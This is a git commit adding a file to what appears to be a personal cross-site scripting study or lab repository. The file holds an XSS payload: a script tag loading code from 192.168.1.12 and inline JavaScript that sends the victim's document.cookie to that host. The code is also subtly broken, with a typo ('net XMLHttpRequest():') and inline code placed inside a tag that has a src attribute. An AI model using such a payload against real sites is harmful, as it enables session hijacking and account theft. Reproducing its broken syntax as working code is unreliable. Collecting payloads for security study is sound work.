4c3afea0595973c9de7576d5220a7fb43bb73c3d
Mohamed El Abbass <mohamedelabbass21@gmail.com>
2026-02-02 17:37:14 +0100

    update xss

---
+++ 02 - Cross-Site Scripting (XSS)/external-js-source.js
@@ -0,0 +1,8 @@
+<script src="http://192.168.1.12/external-js-source.js">
+
+  var request = net XMLHttpRequest():
+  request.open('GET', 'http://192.168.1.12/?cookie=' + document.cookie);
+  request.send();
+
+</script>
+
